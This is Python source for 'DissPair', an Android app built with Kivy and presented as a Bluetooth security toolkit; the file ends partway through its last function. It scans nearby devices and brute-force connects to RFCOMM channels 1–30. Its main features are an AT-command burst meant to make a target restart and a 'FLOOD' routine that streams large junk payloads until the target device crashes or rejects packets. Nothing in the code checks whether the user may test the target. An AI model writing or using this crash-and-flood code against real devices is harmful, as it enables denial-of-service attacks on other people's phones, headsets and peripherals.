import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.widget import Widget
from kivy.uix.modalview import ModalView
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.utils import platform
from kivy.core.window import Window
from kivy.lang import Builder
from kivy.metrics import dp
from kivy.properties import ListProperty, BooleanProperty, NumericProperty
from kivy.uix.slider import Slider
from kivy.factory import Factory
import threading
import time

Window.clearcolor = (0.04, 0.04, 0.06, 1)

# ── Widget classes ─────────────────────────────────────────────────────────────
class RoundedButton(Button):
    bg_color  = ListProperty([0.15, 0.15, 0.20, 1])
    is_active = BooleanProperty(False)

class DeviceCard(BoxLayout):
    bg_color = ListProperty([0.09, 0.09, 0.13, 1])

class ChannelRow(BoxLayout):
    pass

class TerminalLog(ScrollView):
    pass

Builder.load_string("""
# ── KV ──────────────────────────────────────────────────────────────────────

<RoundedButton>:
    background_normal: ''
    background_color: 0, 0, 0, 0
    color: 1, 1, 1, 1
    font_size: '12sp'
    bold: True
    canvas.before:
        Color:
            rgba: 0, 0, 0, 0.45
        RoundedRectangle:
            pos: self.x + dp(1), self.y - dp(2)
            size: self.width, self.height
            radius: [dp(8)]
        Color:
            rgba: (self.bg_color[0]*0.55, self.bg_color[1]*0.55, self.bg_color[2]*0.55, 1) if self.state == 'down' else self.bg_color
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [dp(8)]
        Color:
            rgba: 1, 1, 1, 0.09
        Line:
            rounded_rectangle: [self.x+dp(1), self.y+dp(1), self.width-dp(2), self.height-dp(2), dp(7)]
            width: 0.9

<DeviceCard>:
    orientation: 'vertical'
    padding: dp(14), dp(10)
    spacing: dp(3)
    size_hint_y: None
    height: dp(84)
    canvas.before:
        Color:
            rgba: 0, 0, 0, 0.5
        RoundedRectangle:
            pos: self.x + dp(1), self.y - dp(3)
            size: self.width, self.height
            radius: [dp(14)]
        Color:
            rgba: self.bg_color
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [dp(14)]
        Color:
            rgba: 0, 0.898, 1, 0.55
        RoundedRectangle:
            pos: self.x, self.y + dp(12)
            size: dp(3), self.height - dp(24)
            radius: [dp(2)]
        Color:
            rgba: 0, 0.898, 1, 0.07
        Line:
            rounded_rectangle: [self.x, self.y, self.width, self.height, dp(14)]
            width: 0.8

<ChannelRow>:
    padding: dp(8), dp(6)
    spacing: dp(5)
    canvas.before:
        Color:
            rgba: 0.09, 0.09, 0.13, 1
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [dp(10)]
        Color:
            rgba: 0, 0.6, 0.7, 0.4
        RoundedRectangle:
            pos: self.x, self.y + dp(6)
            size: dp(3), self.height - dp(12)
            radius: [dp(2)]
        Color:
            rgba: 1, 1, 1, 0.04
        Line:
            rounded_rectangle: [self.x, self.y, self.width, self.height, dp(10)]
            width: 0.7

<TerminalLog>:
    bar_width: dp(3)
    bar_color: 0, 0.898, 1, 0.35
    canvas.before:
        Color:
            rgba: 0.03, 0.03, 0.05, 1
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [dp(10)]
        Color:
            rgba: 0, 0.898, 1, 0.07
        Line:
            rounded_rectangle: [self.x, self.y, self.width, self.height, dp(10)]
            width: 0.8

<EnumModal@ModalView>:
    size_hint: 0.94, 0.94
    auto_dismiss: False
    background_color: 0, 0, 0, 0.72
    BoxLayout:
        orientation: 'vertical'
        padding: dp(16), dp(14)
        spacing: dp(8)
        canvas.before:
            Color:
                rgba: 0, 0, 0, 0.7
            RoundedRectangle:
                pos: self.x + dp(4), self.y - dp(5)
                size: self.width, self.height
                radius: [dp(20)]
            Color:
                rgba: 0.07, 0.07, 0.10, 1
            RoundedRectangle:
                pos: self.pos
                size: self.size
                radius: [dp(20)]
            Color:
                rgba: 0, 0.898, 1, 0.20
            Line:
                rounded_rectangle: [self.x+dp(1), self.y+dp(1), self.width-dp(2), self.height-dp(2), dp(19)]
                width: 1.1
        BoxLayout:
            orientation: 'horizontal'
            size_hint_y: None
            height: dp(38)
            spacing: dp(10)
            Widget:
                size_hint_x: None
                width: dp(38)
                canvas:
                    Color:
                        rgba: 0, 0.898, 1, 0.2
                    Ellipse:
                        pos: self.x + dp(4), self.y + dp(4)
                        size: dp(30), dp(30)
                    Color:
                        rgba: 0, 0.898, 1, 1
                    Ellipse:
                        pos: self.x + dp(11), self.y + dp(11)
                        size: dp(16), dp(16)
            Label:
                id: enum_title
                text: "[b][color=00E5FF]TARGET AUDITOR[/color][/b]"
                markup: True
                halign: 'left'
                valign: 'middle'
                font_size: '16sp'
                text_size: self.size
        Label:
            id: enum_subtitle
            text: "Initialising..."
            size_hint_y: None
            height: dp(20)
            font_size: '11sp'
            color: 0.40, 0.45, 0.58, 1
            halign: 'left'
            valign: 'middle'
            text_size: self.size
        Widget:
            size_hint_y: None
            height: dp(1)
            canvas:
                Color:
                    rgba: 0, 0.898, 1, 0.12
                Rectangle:
                    pos: self.pos
                    size: self.size
        ScrollView:
            size_hint_y: 0.45
            bar_width: dp(3)
            bar_color: 0, 0.898, 1, 0.25
            BoxLayout:
                id: channel_list
                orientation: 'vertical'
                size_hint_y: None
                height: self.minimum_height
                spacing: dp(5)
                padding: 0, dp(2)
        Widget:
            size_hint_y: None
            height: dp(1)
            canvas:
                Color:
                    rgba: 1, 1, 1, 0.05
                Rectangle:
                    pos: self.pos
                    size: self.size
        TerminalLog:
            id: enum_log_scroll
            size_hint_y: 0.25
            BoxLayout:
                id: enum_log_container
                orientation: 'vertical'
                size_hint_y: None
                padding: dp(10), dp(6)
                spacing: dp(1)
                height: self.minimum_height
        Widget:
            size_hint_y: None
            height: dp(1)
            canvas:
                Color:
                    rgba: 1, 1, 1, 0.05
                Rectangle:
                    pos: self.pos
                    size: self.size
        BoxLayout:
            orientation: 'horizontal'
            size_hint_y: None
            height: dp(36)
            spacing: dp(8)
            padding: dp(2), 0
            Label:
                text: "[color=44445A]PAYLOAD[/color]"
                markup: True
                size_hint_x: None
                width: dp(62)
                font_size: '10sp'
                halign: 'right'
                valign: 'middle'
                text_size: self.size
            Slider:
                id: payload_slider
                min: 64
                max: 65536
                step: 64
                value: 2048
                cursor_size: dp(20), dp(20)
                on_value: payload_lbl.text = "[b][color=00E5FF]{}[/color][/b] [color=44445A]B[/color]".format(int(self.value)); app.payload_size = int(self.value)
            Label:
                id: payload_lbl
                text: "[b][color=00E5FF]2048[/color][/b] [color=44445A]B[/color]"
                markup: True
                size_hint_x: None
                width: dp(76)
                font_size: '12sp'
                halign: 'left'
                valign: 'middle'
                text_size: self.size
        BoxLayout:
            orientation: 'horizontal'
            size_hint_y: None
            height: dp(48)
            spacing: dp(10)
            RoundedButton:
                text: "STOP FLOOD"
                bg_color: 0.85, 0.45, 0.0, 1
                on_press: app.stop_flood()
            RoundedButton:
                text: "CLOSE"
                bg_color: 0.75, 0.12, 0.22, 1
                on_press: root.dismiss()
""")

if platform == 'android':
    from android.permissions import request_permissions, check_permission
    from jnius import autoclass, cast, PythonJavaClass, java_method
else:
    class Dummy: pass
    autoclass = lambda x: Dummy()
    cast = lambda x, y: x
    class PythonJavaClass: pass
    def java_method(x): return lambda y: y

class StableLeScanCallback(PythonJavaClass):
    __javainterfaces__ = ['android/bluetooth/BluetoothAdapter$LeScanCallback']
    __javacontext__ = 'app'

    def __init__(self, callback):
        super().__init__()
        self.callback = callback

    @java_method('(Landroid/bluetooth/BluetoothDevice;I[B)V')
    def onLeScan(self, device, rssi, scanRecord):
        try:
            self.callback(device, rssi, "BLE")
        except Exception:
            pass

class DissPairApp(App):
    is_busy      = BooleanProperty(False)
    payload_size = NumericProperty(2048)

    def build(self):
        self.title = 'DissPair'
        self.icon = 'disspair_logo.png' 

        self.found_devices     = set()
        self.is_scanning       = False
        self.adapter           = None
        self.current_scan_type = "CLASSIC"
        self.scan_receiver     = None
        self.le_callback_obj   = None
        self.enum_modal        = None
        self.current_enum_mac  = None
        self.flood_active      = False
        self.active_threads_flag = False
        
        # We hold the active verified socket so the flood runs instantly
        self.active_socket     = None 
        
        self._added_channels = set()

        root = BoxLayout(orientation='vertical', padding=dp(14), spacing=dp(12))

        # Header
        hdr = BoxLayout(orientation='horizontal', size_hint_y=None, height=dp(68), spacing=dp(14))
        
        logo = Image(source='disspair_logo.png', size_hint=(None, None), size=(dp(64), dp(64)))
        hdr.add_widget(logo)
        
        name_box = BoxLayout(orientation='vertical', spacing=dp(3))
        name_lbl = Label(
            text="[b][color=00E5FF]Diss[/color][color=FF2D55]Pair[/color][/b]",
            markup=True, font_size='24sp', halign='left', valign='bottom'
        )
        name_lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))
        tag_lbl = Label(
            text="[color=44445A]Bluetooth Security Toolkit [/color]",
            markup=True, font_size='10sp', halign='left', valign='top'
        )
        tag_lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))
        name_box.add_widget(name_lbl)
        name_box.add_widget(tag_lbl)
        hdr.add_widget(name_box)
        root.add_widget(hdr)

        # System log
        self.log_scroll = TerminalLog(size_hint_y=0.22, bar_width=dp(3))
        self.log_container = BoxLayout(
            orientation='vertical', size_hint_y=None, padding=dp(8), spacing=dp(1)
        )
        self.log_container.bind(minimum_height=self.log_container.setter('height'))
        self.log_scroll.add_widget(self.log_container)
        root.add_widget(self.log_scroll)

        # Scan buttons
        scan_row = BoxLayout(orientation='horizontal', size_hint_y=None, height=dp(52), spacing=dp(12))
        self.btn_classic = RoundedButton(text="SCAN CLASSIC", bg_color=(0.06, 0.38, 0.72, 1))
        self.btn_classic.bind(on_press=lambda x: self.toggle_scan("CLASSIC"))
        self.btn_ble = RoundedButton(text="SCAN BLE", bg_color=(0.0, 0.55, 0.32, 1))
        self.btn_ble.bind(on_press=lambda x: self.toggle_scan("BLE"))
        scan_row.add_widget(self.btn_classic)
        scan_row.add_widget(self.btn_ble)
        root.add_widget(scan_row)

        # Targets header
        tgt_hdr = BoxLayout(orientation='horizontal', size_hint_y=None, height=dp(34), spacing=dp(8))
        tgt_lbl = Label(
            text="[b][color=44445A]TARGET LIST[/color][/b]",
            markup=True, font_size='11sp', halign='left', valign='middle'
        )
        tgt_lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))
        btn_clear = RoundedButton(
            text="CLEAR", size_hint_x=None, width=dp(72),
            bg_color=(0.55, 0.10, 0.18, 1), font_size='11sp'
        )
        btn_clear.bind(on_press=self.clear_results)
        tgt_hdr.add_widget(tgt_lbl)
        tgt_hdr.add_widget(btn_clear)
        root.add_widget(tgt_hdr)

        # Segmented Device List
        self.results_scroll = ScrollView(size_hint_y=1, bar_width=dp(3), bar_color=(0, 0.898, 1, 0.3))
        self.results_layout = BoxLayout(orientation='vertical', size_hint_y=None, spacing=dp(12))
        self.results_layout.bind(minimum_height=self.results_layout.setter('height'))
        
        self.paired_header = Label(
            text="[b][color=00E5FF]PAIRED DEVICES[/color][/b]",
            markup=True, font_size='11sp', halign='left', size_hint_y=None, height=dp(20)
        )
        self.paired_header.bind(size=lambda w, s: setattr(w, 'text_size', s))
        self.results_layout.add_widget(self.paired_header)
        
        self.paired_list = BoxLayout(orientation='vertical', size_hint_y=None, spacing=dp(8))
        self.paired_list.bind(minimum_height=self.paired_list.setter('height'))
        self.results_layout.add_widget(self.paired_list)
        
        self.results_layout.add_widget(BoxLayout(size_hint_y=None, height=dp(5)))
        
        self.disc_header = Label(
            text="[b][color=00E5FF]NEW DISCOVERED DEVICES[/color][/b]",
            markup=True, font_size='11sp', halign='left', size_hint_y=None, height=dp(20)
        )
        self.disc_header.bind(size=lambda w, s: setattr(w, 'text_size', s))
        self.results_layout.add_widget(self.disc_header)
        
        self.discovered_list = BoxLayout(orientation='vertical', size_hint_y=None, spacing=dp(8))
        self.discovered_list.bind(minimum_height=self.discovered_list.setter('height'))
        self.results_layout.add_widget(self.discovered_list)

        self.results_scroll.add_widget(self.results_layout)
        root.add_widget(self.results_scroll)

        if platform == 'android':
            Clock.schedule_once(lambda dt: self.init_bt_bridge(), 0.5)

        return root

    def on_start(self):
        splash = ModalView(
            size_hint=(1, 1),
            auto_dismiss=False,
            background_color=(0.04, 0.04, 0.06, 1)
        )
        content = BoxLayout(orientation='vertical', spacing=dp(20), padding=dp(40))

        logo_wrap = BoxLayout(size_hint_y=None, height=dp(140))
        logo_big = Image(source='disspair_logo.png', size_hint=(None, None), size=(dp(140), dp(140)),
                              pos_hint={'center_x': 0.5})
        logo_wrap.add_widget(logo_big)
        content.add_widget(logo_wrap)

        splash_name = Label(
            text="[b][color=00E5FF]Diss[/color][color=FF2D55]Pair[/color][/b]",
            markup=True, font_size='38sp', halign='center', valign='middle',
            size_hint_y=None, height=dp(60)
        )
        splash_name.bind(size=lambda w, s: setattr(w, 'text_size', s))
        content.add_widget(splash_name)

        splash_tag = Label(
            text="[color=44445A]Bluetooth Security Toolkit[/color]",
            markup=True, font_size='13sp', halign='center', valign='middle',
            size_hint_y=None, height=dp(24)
        )
        splash_tag.bind(size=lambda w, s: setattr(w, 'text_size', s))
        content.add_widget(splash_tag)

        splash_ver = Label(
            text="[color=2a2a3a]v1.72[/color]",
            markup=True, font_size='11sp', halign='center',
            size_hint_y=None, height=dp(20)
        )
        content.add_widget(splash_ver)

        splash.add_widget(content)
        splash.open()
        Clock.schedule_once(lambda dt: splash.dismiss(), 2.2)

    def on_stop(self):
        self.active_threads_flag = False
        self.flood_active = False
        if getattr(self, 'active_socket', None):
            try: self.active_socket.close()
            except Exception: pass
            self.active_socket = None
        if self.adapter:
            try:
                if self.adapter.isDiscovering(): self.adapter.cancelDiscovery()
            except: pass
            try:
                if self.le_callback_obj: self.adapter.stopLeScan(self.le_callback_obj)
            except: pass
        if self.scan_receiver:
            try: self.scan_receiver.stop()
            except: pass
        if platform == 'android':
            try:
                System = autoclass('java.lang.System')
                System.gc()
            except: pass

    _COLOR_MAP = {
        "00FF00": "39FF14", "ff5555": "FF2D55", "ff0000": "FF2D55",
        "ffaa00": "FF8C00", "00E5FF": "00E5FF", "aaaaaa": "44445A",
        "ffff00": "FFE066",
    }

    def _remap(self, color):
        return self._COLOR_MAP.get(color, color)

    def log(self, msg, color="7a7a9a"):
        lbl = Label(
            text="[color={}]{}[/color]".format(self._remap(color), msg),
            size_hint_y=None, height=dp(22),
            markup=True, font_size='11sp', halign='left'
        )
        lbl.bind(size=lambda w, s: setattr(w, 'text_size', (s[0], None)))
        self.log_container.add_widget(lbl)
        self.log_scroll.scroll_y = 0

    def safe_log(self, msg, color="7a7a9a"):
        Clock.schedule_once(lambda dt: self.log(msg, color))

    def enum_log(self, msg, color="7a7a9a"):
        if not self.enum_modal: return
        try:
            lbl = Label(
                text="[color={}]{}[/color]".format(self._remap(color), msg),
                size_hint_y=None, height=dp(22),
                markup=True, font_size='11sp', halign='left'
            )
            lbl.bind(size=lambda w, s: setattr(w, 'text_size', (s[0], None)))
            self.enum_modal.ids.enum_log_container.add_widget(lbl)
            self.enum_modal.ids.enum_log_scroll.scroll_y = 0
        except Exception:
            pass

    def safe_enum_log(self, msg, color="7a7a9a"):
        Clock.schedule_once(lambda dt: self.enum_log(msg, color))

    def init_bt_bridge(self):
        try:
            BluetoothAdapter = autoclass('android.bluetooth.BluetoothAdapter')
            self.adapter = BluetoothAdapter.getDefaultAdapter()
            if not self.adapter:
                self.log("No Bluetooth hardware found.", "ff5555")
                return
            self.le_callback_obj = StableLeScanCallback(self.on_device_found_logic)
            self.log("Bluetooth ready.", "00FF00")
            self.list_paired_devices()
        except Exception as e:
            self.log("Bridge error: {}".format(e), "ff5555")

    def toggle_scan(self, scan_mode):
        if self.is_busy: return
        if platform != 'android':
            self.log("Scan only works on Android.", "ffaa00")
            return
        if not self.adapter:
            self.log("Bluetooth adapter missing.", "ff5555")
            return
        if self.is_scanning:
            self.stop_scan()
            return
            
        self.is_busy = True
        self.current_scan_type = scan_mode
        
        perms = [
            "android.permission.BLUETOOTH_SCAN",
            "android.permission.BLUETOOTH_CONNECT",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION" 
        ]
        
        needed = [p for p in perms if not check_permission(p)]
        if not needed:
            self.is_busy = False
            self.execute_discovery()
        else:
            self.log("Requesting permissions...", "ffaa00")
            def on_perm(permissions, grants):
                self.is_busy = False
                if all(grants):
                    Clock.schedule_once(lambda dt: self.execute_discovery())
                else:
                    Clock.schedule_once(lambda dt: self.log("Permissions denied.", "ff5555"))
            request_permissions(needed, on_perm)

    def execute_discovery(self):
        if not self.adapter: return
        if not self.adapter.isEnabled():
            self.log("Bluetooth is OFF.", "ff5555")
            return
            
        self.log("Starting {} scan...".format(self.current_scan_type), "00E5FF")
        try:
            if self.current_scan_type == "CLASSIC":
                from android.broadcast import BroadcastReceiver
                if self.scan_receiver:
                    try: self.scan_receiver.stop()
                    except: pass
                    self.scan_receiver = None
                    
                self.scan_receiver = BroadcastReceiver(
                    self.on_scan_broadcast,
                    actions=[
                        'android.bluetooth.device.action.FOUND',
                        'android.bluetooth.adapter.action.DISCOVERY_FINISHED',
                    ]
                )
                self.scan_receiver.start()
                self.adapter.startDiscovery()
                self.btn_classic.text = "STOP"
                self.btn_classic.bg_color = (0.75, 0.12, 0.22, 1)
                self.btn_ble.disabled = True
                
            elif self.current_scan_type == "BLE":
                if self.le_callback_obj:
                    self.adapter.startLeScan(self.le_callback_obj)
                    self.btn_ble.text = "STOP"
                    self.btn_ble.bg_color = (0.75, 0.12, 0.22, 1)
                    self.btn_classic.disabled = True
                    
            self.is_scanning = True
        except Exception as e:
            self.log("Scan error: {}".format(e), "ff5555")
            self.stop_scan()

    def _restart_discovery(self):
        if self.active_threads_flag or self.enum_modal: return
        if self.is_scanning and self.current_scan_type == "CLASSIC" and self.adapter:
            try: self.adapter.startDiscovery()
            except: pass

    def stop_scan(self):
        if self.adapter:
            try: self.adapter.cancelDiscovery()
            except: pass
            try:
                if self.le_callback_obj: self.adapter.stopLeScan(self.le_callback_obj)
            except: pass
            
        if self.scan_receiver:
            try: self.scan_receiver.stop()
            except: pass
            self.scan_receiver = None
            
        self.is_scanning = False
        self.btn_classic.text = "SCAN CLASSIC"
        self.btn_classic.bg_color = (0.06, 0.38, 0.72, 1)
        self.btn_ble.text = "SCAN BLE"
        self.btn_ble.bg_color = (0.0, 0.55, 0.32, 1)
        self.btn_classic.disabled = False
        self.btn_ble.disabled = False
        self.safe_log("Scan aborted.", "44445A")

    def on_scan_broadcast(self, context, intent):
        action = intent.getAction()
        if action == 'android.bluetooth.device.action.FOUND':
            raw = intent.getParcelableExtra("android.bluetooth.device.extra.DEVICE")
            if raw:
                self.on_device_found_logic(cast('android.bluetooth.BluetoothDevice', raw), -99, "Classic")
        elif action == 'android.bluetooth.adapter.action.DISCOVERY_FINISHED':
            if self.is_scanning and self.current_scan_type == "CLASSIC":
                Clock.schedule_once(lambda dt: self._restart_discovery(), 1.5)

    # ── ENUMERATION (CONNECTION-BASED CHANNEL DISCOVERY) ──────────────────────
    def start_enumeration(self, mac, name):
        self.stop_scan()
        self.current_enum_mac  = mac
        self.flood_active      = False
        self.active_threads_flag = True
        self._added_channels.clear()

        # Sever old sockets just in case
        if getattr(self, 'active_socket', None):
            try: self.active_socket.close()
            except Exception: pass
            self.active_socket = None

        self.enum_modal = Factory.EnumModal()
        self.enum_modal.bind(on_dismiss=self.on_enum_close)
        self.enum_modal.ids.enum_subtitle.text = "{}  -  {}".format(name, mac)
        self.enum_modal.open()

        # Start background brutal connection sweep
        threading.Thread(target=self._enum_thread, args=(mac,), daemon=True).start()

    def on_enum_close(self, instance):
        self.active_threads_flag = False
        self.flood_active = False
        if getattr(self, 'active_socket', None):
            try: self.active_socket.close()
            except: pass
            self.active_socket = None

        self.current_enum_mac  = None
        self.enum_modal        = None
        self.log("Audit closed. Connection terminated safely.", "44445A")
        
        if platform == 'android':
            try:
                System = autoclass('java.lang.System')
                System.gc()
            except: pass

    def _enum_thread(self, mac):
        self.safe_enum_log("[*] Discovering RFCOMM channels via connection...", "00E5FF")
        device = self.adapter.getRemoteDevice(mac)
        found_any = False

        # Probe Channels 1-30 (Covers ALL standard RFCOMM configurations)
        for ch in range(1, 31):
            if not self.active_threads_flag: return
            if self.current_enum_mac != mac: return
            
            self.safe_enum_log(f"    Probing Channel {ch}...", "44445A")
            is_open = False
            c_type = ""

            # Attempt 1: Try Insecure (Unpaired)
            sock = None
            try:
                try: sock = device.createInsecureRfcommSocket(ch)
                except AttributeError: sock = device.createRfcommSocket(ch)
                sock.connect()
                is_open = True
                c_type = "Unpaired"
            except Exception:
                pass
            finally:
                if sock:
                    try: sock.close()
                    except: pass

            # Attempt 2: Try Secure (Paired) if insecure failed
            if not is_open:
                if not self.active_threads_flag: return
                sock = None
                try:
                    sock = device.createRfcommSocket(ch)
                    sock.connect()
                    is_open = True
                    c_type = "Paired"
                except Exception:
                    pass
                finally:
                    if sock:
                        try: sock.close()
                        except: pass
            
            # If successful, we found a real, verified RFCOMM channel!
            if is_open:
                found_any = True
                self.safe_enum_log(f"[+] Found open RFCOMM Channel {ch} ({c_type})", "00FF00")
                Clock.schedule_once(lambda dt, c=ch, t=c_type: self.add_channel_ui(mac, c, t))
        
        if not found_any:
            self.safe_enum_log("[-] No open channels detected.", "ff5555")
        else:
            self.safe_enum_log("[*] Discovery complete. Select a channel to verify.", "00E5FF")

    def add_channel_ui(self, mac, ch, c_type):
        if not self.enum_modal or self.current_enum_mac != mac: return
        if ch in self._added_channels: return
        self._added_channels.add(ch)
        
        row = ChannelRow(size_hint_y=None, height=dp(50))

        lbl = Label(
            text=f"[b][color=cccccc]Channel {ch}[/color][/b]\n[size=10sp][color=888888]Supports: {c_type}[/color][/size]",
            markup=True, halign='left', valign='middle', font_size='13sp',
            size_hint_x=0.55
        )
        lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))
        row.add_widget(lbl)

        btn_box = BoxLayout(orientation='horizontal', size_hint_x=0.45, spacing=dp(5))

        btn_kali = RoundedButton(text="Linux TTY", bg_color=(0.55, 0.12, 0.70, 1), font_size='10sp')
        btn_kali.bind(on_press=lambda x: self.handle_row_action(mac, ch, c_type, x))
        
        btn_conn = RoundedButton(text="CONNECT", bg_color=(0.04, 0.40, 0.50, 1), font_size='10sp')
        btn_conn.bind(on_press=lambda x: self.handle_row_action(mac, ch, c_type, x))

        btn_box.add_widget(btn_kali)
        btn_box.add_widget(btn_conn)
        row.add_widget(btn_box)

        self.enum_modal.ids.channel_list.add_widget(row)

    # ── ACTION HANDLER (CONNECT -> FLOOD) ─────────────────────────────────────
    def handle_row_action(self, mac, ch, c_type, btn):
        if btn.text == "Linux TTY":
            btn.text = "PROBING.."
            btn.bg_color = (0.75, 0.12, 0.22, 1)
            threading.Thread(target=self._kali_sim_thread, args=(mac, ch, c_type, btn), daemon=True).start()
            
        elif btn.text == "CONNECT":
            btn.text = "WAIT..."
            btn.bg_color = (0.8, 0.6, 0.1, 1)
            threading.Thread(target=self._connect_thread, args=(mac, ch, c_type, btn), daemon=True).start()
            
        elif btn.text == "FLOOD":
            btn.text = "STOP"
            btn.bg_color = (0.8, 0.1, 0.2, 1)
            self.flood_active = True
            threading.Thread(target=self._flood_thread, args=(ch, btn), daemon=True).start()
            
        elif btn.text == "STOP":
            self.stop_flood()
            btn.text = "CONNECT"
            btn.bg_color = (0.04, 0.40, 0.50, 1)

    def _kali_sim_thread(self, mac, ch, c_type, btn):
        self.safe_enum_log(f"[*] Simulating Linux TTY Modem noise on Ch {ch}...", "d500ff")
        
        # Sever any previous connections before opening a new one
        if self.active_socket:
            try: self.active_socket.close()
            except: pass
            self.active_socket = None
            
        device = self.adapter.getRemoteDevice(mac)
        sock = None
        
        try:
            if c_type == "Unpaired":
                try: sock = device.createInsecureRfcommSocket(ch)
                except AttributeError: sock = device.createRfcommSocket(ch)
            else:
                sock = device.createRfcommSocket(ch)
                
            sock.connect()
            self.safe_enum_log(f"[+] Connected! Blasting Linux AT Modem probes...", "00FF00")
            
            out_stream = sock.getOutputStream()
            

            kali_noise = [
                b"AT\r\n", b"ATZ\r\n", b"AT+CGMI\r\n", 
                b"AT+CMEE=1\r\n", b"AT+GMM\r\n", b"AT+GMR\r\n"
            ] * 10 
            
            for probe in kali_noise:
                out_stream.write(probe)
                out_stream.flush()
                time.sleep(0.01) # Give it 10ms to physically transmit
                
            self.safe_enum_log(f"[*] Burst complete. Check if target restarted.", "ffaa00")
            
        except Exception as e:
            self.safe_enum_log(f"[-] Target rejected connection or crashed: {e}", "ff5555")
        finally:
            if sock: 
                try: sock.close()
                except: pass
            
            def reset_btn(dt):
                btn.text = "Linux TTY"
                btn.bg_color = (0.55, 0.12, 0.70, 1)
            Clock.schedule_once(reset_btn, 1.0)

    def _connect_thread(self, mac, ch, c_type, btn):
        self.safe_enum_log(f"[*] Verifying connection to Channel {ch}...", "ffaa00")
        
        # Sever any previous connections before opening a new one
        if self.active_socket:
            try: self.active_socket.close()
            except: pass
            self.active_socket = None
            
        device = self.adapter.getRemoteDevice(mac)
        sock = None
        
        try:
            # Respect the security layer we discovered during the sweep
            if c_type == "Unpaired":
                try: sock = device.createInsecureRfcommSocket(ch)
                except AttributeError: sock = device.createRfcommSocket(ch)
            else:
                sock = device.createRfcommSocket(ch)
                
            sock.connect()
            self.active_socket = sock
            self.safe_enum_log(f"[+] Verified! Ready to flood Ch {ch}.", "00FF00")
            
            # Transition UI to Attack phase
            def update_btn(dt):
                btn.text = "FLOOD"
                btn.bg_color = (0.75, 0.12, 0.22, 1)
            Clock.schedule_once(update_btn)
            
        except Exception as e:
            self.safe_enum_log(f"[-] Connection verification failed: {e}", "ff5555")
            if sock: 
                try: sock.close()
                except: pass
            def reset_btn(dt):
                btn.text = "CONNECT"
                btn.bg_color = (0.04, 0.40, 0.50, 1)
            Clock.schedule_once(reset_btn)

    def _flood_thread(self, ch, btn):
        if not self.active_socket:
            self.safe_enum_log("[-] No active socket to flood!", "ff5555")
            return
            
        self.safe_enum_log(f"[!] INITIATING FLOOD ON CH {ch}...", "ff0000")
        try:
            out_stream = self.active_socket.getOutputStream()
            blocks_sent = 0
            
            while self.flood_active:
                blocks_sent += 1
                try:
                    out_stream.write(b"X" * max(64, self.payload_size))
                    out_stream.flush()
                    # CRITICAL FIX: Give Android's radio 10ms to physically transmit the packet 
                    # out of the antenna. Without this, the local RAM buffer overflows instantly 
                    # and Android force-closes the socket before the target ever receives the flood!
                    time.sleep(0.01) 
                except Exception:
                    if self.flood_active:
                        self.safe_enum_log("Fuzzing Completed: The device seems to be crashed or is rejecting packets, kindly verify manually.", "00FF00")
                    break
            
            if blocks_sent > 0 and not self.flood_active:
                self.safe_enum_log(f"[*] Flood stopped by user. {blocks_sent} blocks sent.", "ffaa00")
                
        except Exception as e:
            self.safe_enum_log(f"[-] Flood error: {e}", "ff5555")
        finally:
            self.flood_active = False
            if self.active_socket:
                try: self.active_socket.close()
                except: pass
                self.active_socket = None
                
            # Reset UI back to the manual verification stage
            def reset_btn(dt):
                btn.text = "CONNECT"
                btn.bg_color = (0.04, 0.40, 0.50, 1)
            Clock.schedule_once(reset_btn)

    def stop_flood(self):
        if self.flood_active:
            self.flood_active = False
            self.safe_enum_log("Flood aborted. Disconnecting...", "ffaa00")
            if getattr(self, 'active_socket', None):
                try: self.active_socket.close()
                except: pass
                self.active_socket = None
        else:
            self.safe_enum_log("No flood running.", "44445A")

    # ── Device list ───────────────────────────────────────────────────────────

    def clear_results(self, instance):
        self.paired_list.clear_widgets()
        self.discovered_list.clear_widgets()
        self.found_devices.clear()
        self.list_paired_devices()

    def on_device_found_logic(self, device, rssi, dtype):
        Clock.schedule_once(lambda dt: self.process_device(device, rssi, dtype))

    def process_device(self, device, rssi, dtype):
        try:
            mac = device.getAddress()
            try:
                if dtype == "Classic" and device.getType() == 2: return
            except: pass
            
            if mac not in self.found_devices:
                self.found_devices.add(mac)
                name = "Unknown"
                try: name = device.getName() or "Unknown"
                except: pass
                
                self.add_ui_result(name, mac, dtype=dtype, rssi=rssi)
        except: pass

    def add_ui_result(self, name, mac, dtype="Classic", rssi=None):
        card = DeviceCard()
        row  = BoxLayout(orientation='horizontal', spacing=dp(10))

        info = BoxLayout(orientation='vertical', spacing=dp(2))
        name_lbl = Label(
            text="[b]{}[/b]".format(name),
            markup=True, halign='left', valign='middle',
            font_size='14sp', color=(0.95, 0.95, 1, 1)
        )
        name_lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))

        meta_color = {"Classic": "00E5FF", "BLE": "39FF14", "PAIRED": "FF8C00"}.get(dtype, "7a7a9a")
        meta_lbl = Label(
            text="[color=44445A]{}[/color]   [color={}]{}[/color]".format(mac, meta_color, dtype),
            markup=True, halign='left', valign='middle', font_size='11sp'
        )
        meta_lbl.bind(size=lambda w, s: setattr(w, 'text_size', s))

        info.add_widget(name_lbl)
        info.add_widget(meta_lbl)
        row.add_widget(info)

        if dtype in ("Classic", "PAIRED"):
            btn = RoundedButton(
                text="ENUMERATE", size_hint_x=None, width=dp(108),
                bg_color=(0.70, 0.38, 0.0, 1), font_size='12sp'
            )
            btn.bind(on_press=lambda x: self.start_enumeration(mac, name))
            row.add_widget(btn)
        elif dtype == "BLE":
            # Feature pending label instead of GATT button
            lbl_soon = Label(
                text="[i][color=888888]Feature to be added soon[/color][/i]",
                markup=True, halign='right', valign='middle', font_size='10sp',
                size_hint_x=None, width=dp(108)
            )
            lbl_soon.bind(size=lambda w, s: setattr(w, 'text_size', s))
            row.add_widget(lbl_soon)

        card.add_widget(row)
        
        if dtype == "PAIRED":
            self.paired_list.add_widget(card)
        else:
            self.discovered_list.add_widget(card)

    def list_paired_devices(self):
